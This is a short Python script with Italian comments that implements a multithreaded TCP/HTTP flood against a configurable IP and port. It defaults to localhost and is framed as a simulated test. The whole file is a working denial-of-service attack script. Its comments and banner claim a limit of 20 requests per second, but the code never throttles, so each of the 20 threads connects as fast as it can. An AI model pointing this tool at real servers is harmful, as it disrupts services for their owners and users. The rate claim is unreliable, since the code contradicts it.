import socket
import time
import threading

TARGET_IP = "127.0.0.1"   # cambiare con ip del server di test se a disposizione
TARGET_PORT = 8080        # cambiare con la porta d'attacco desiderata
REQUESTS_PER_SECOND = 20  # Intensità dell'attacco impostata a 20 req/s
DURATION = 10             # Secondi totali di attacco

def flood():
    """Invio 20 req/s TCP"""
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect((TARGET_IP, TARGET_PORT))
            # richiesta HTTP fake
            s.sendall(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
            s.close()
        except Exception:
            pass

def main():
    print(f"[INFO] Avvio flood simulato su {TARGET_IP}:{TARGET_PORT} "
            f"per {DURATION} secondi a {REQUESTS_PER_SECOND} req/s")

    threads = []
    for _ in range(REQUESTS_PER_SECOND):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[INFO] Attacco simulato terminato.")

if __name__ == "__main__":
    main()
